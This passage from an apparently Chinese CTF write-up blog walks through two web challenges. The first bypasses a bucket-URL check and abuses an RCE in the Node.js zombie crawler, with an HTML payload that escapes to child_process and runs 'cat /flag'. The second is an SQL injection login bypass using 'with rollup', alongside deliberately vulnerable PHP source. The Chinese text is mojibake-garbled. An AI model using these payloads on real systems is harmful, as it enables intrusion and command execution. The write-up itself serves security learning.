&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/^https:\/\/[a-f0-9]{32}\.oss-cn-beijing\.ichunqiu\.com\/$/&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">bucket&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`/user/verify?token=&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">authToken&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75715e">// Well, admin won&amp;#39;t do that actually XD.
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;user&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75af00">user&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">user&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">message&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;Admin will check if your bucket is qualified later.&amp;#34;&lt;/span> &lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä½†æ˜¯å‰é¢ä¼šå…ˆè¿‡ä¸€å±‚è¿™ä¸ª&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">utils&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">checkBucket&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">bucket&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;user&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75af00">user&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;Invalid bucket url.&amp;#34;&lt;/span> &lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75715e">// utils.js
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#75af00">checkBucket&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">URL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">protocol&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http:&amp;#34;&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">protocol&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#34;https:&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">href&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">includes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;oss-cn-beijing.ichunqiu.com&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™ä¸ªå¾ˆå¥½ç»•ï¼Œä¸å½±å“åŽé¢çš„ï¼›æŽ¥ä¸‹æ¥å°±æ˜¯æž„é€ evil.htmläº†ï¼Œåˆ©ç”¨crawler.jsæ‰€ç”¨zombieåº“çš„æ¼æ´žï¼Œå…·ä½“æ¼æ´žåˆ†æžå‚è§-&amp;gt;&lt;a href="https://blog.summ3r.top/2021/08/26/Nodejs-Zoombie-Package-RCE-%E5%88%86%E6%9E%90/">Nodejs Zoombie Package RCE åˆ†æž&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75715e">// crawler.js
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">goto&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Promise&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#75af00">resolve&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">reject&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">crawler&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">visit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">resource&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">crawler&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">resources&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>
&lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">crawler&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">resources&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">filter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">resource&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">resource&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">response&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">shift&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">statusCode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">resource&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">response&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">status&lt;/span>
&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">headers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">getHeaders&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">cookies&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">getCookies&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">htmlContent&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">getHtmlContent&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">resolve&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">reject&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">message&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>payloadå¦‚ä¸‹&lt;/p>
&lt;p>bucket url&lt;/p>
&lt;pre tabindex="0">&lt;code>http://101.35.114.107:2301/craw.html?oss-cn-beijing.ichunqiu.com/
&lt;/code>&lt;/pre>&lt;p>craw.html&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#75af00">a&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">constructor&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">constructor&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">constructor&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">constructor&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;return process&amp;#39;&lt;/span>&lt;span style="color:#111">)();&lt;/span>&lt;span style="color:#75af00">b&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">a&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">mainModule&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;child_process&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#75af00">c&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">b&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">execSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;cat /flag&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">();&lt;/span>&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">c&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>flag{bdb5a23f-1436-4b83-9ad9-0a889d34b1f4}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[SWPU2019]Web6
&lt;/h4>
&lt;/summary>
&lt;p>ä¸€ä¸ªç™»å½•é¡µé¢&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211211094347403.png" alt="image-20211211094347403">&lt;/p>
&lt;p>è¿™sqlè¯­å¥éƒ½å†™è„¸ä¸Šäº†ï¼Œä½†æ˜¯åŽŸè°…æˆ‘è€èœé¸¡ï¼Œè‡ªå·±æ²¡è¯•å‡ºæ¥&lt;/p>
&lt;pre tabindex="0">&lt;code>username=1'or '1'='1' group by passwd with rollup having passwd is NULL#&amp;amp;passwd=
&lt;/code>&lt;/pre>&lt;p>ä¹‹å‰çœŸæ²¡è§è¿‡è¿™ç§æ³¨å…¥æ–¹å¼â€¦â€¦ æŸ¥äº†wpåŽçŸ¥é“è¿™æ˜¯&lt;a href="https://www.cnblogs.com/caizhiren/p/7841318.html">å®žéªŒå§3.å› ç¼ºæ€æ±€çš„ç»•è¿‡&lt;/a>ï¼Œé‚£é“é¢˜çš„æºç å¦‚ä¸‹&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">error_reporting&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;uname&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;pwd&amp;#39;&lt;/span>&lt;span style="color:#111">]))&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// ä¸¤ä¸ªå‚æ•°
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;form action=&amp;#34;&amp;#34; method=&amp;#34;post&amp;#34;&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;br/&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;input name=&amp;#34;uname&amp;#34; type=&amp;#34;text&amp;#34;/&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;br/&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;input name=&amp;#34;pwd&amp;#34; type=&amp;#34;text&amp;#34;/&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;br/&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;input type=&amp;#34;submit&amp;#34; /&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;br/&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;/form&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;br/&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;!--source: source.txt--&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;br/&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">AttackFilter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$StrKey&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$StrValue&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$ArrReq&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">is_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$StrValue&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#111">$StrValue&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">implode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$StrValue&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$ArrReq&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;/is&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$StrValue&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">print&lt;/span> &lt;span style="color:#d88200">&amp;#34;æ°´å¯è½½èˆŸï¼Œäº¦å¯èµ›è‰‡ï¼&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">exit&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$filter&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">foreach&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#f92672">=&amp;gt;&lt;/span>&lt;span style="color:#111">$value&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">AttackFilter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$value&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$filter&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// è¿‡æ»¤å­—ç¬¦
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$con&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">mysql_connect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;XXXXXX&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;XXXXXX&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;XXXXXX&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">$con&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Could not connect: &amp;#39;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#75af00">mysql_error&lt;/span>&lt;span style="color:#111">());&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$db&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;XXXXXX&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">mysql_select_db&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$db&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$con&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$sql&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;SELECT * FROM interest WHERE uname = &amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;uname&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// unameå¯æŽ§
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$query&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">mysql_query&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$sql&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">mysql_num_rows&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$query&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// å¦‚æžœåªæŸ¥å‡ºæ¥ä¸€è¡Œæ•°æ®
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">mysql_fetch_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$query&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;pwd&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;pwd&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// æ¯”å¯¹passwd
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">print&lt;/span> &lt;span style="color:#d88200">&amp;#34;CTF{XXXXXX}&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">print&lt;/span> &lt;span style="color:#d88200">&amp;#34;äº¦å¯èµ›è‰‡ï¼&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// æ•°æ®å¤šäºŽä¸€è¡Œ
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">print&lt;/span> &lt;span style="color:#d88200">&amp;#34;ä¸€é¢—èµ›è‰‡ï¼&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">mysql_close&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$con&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
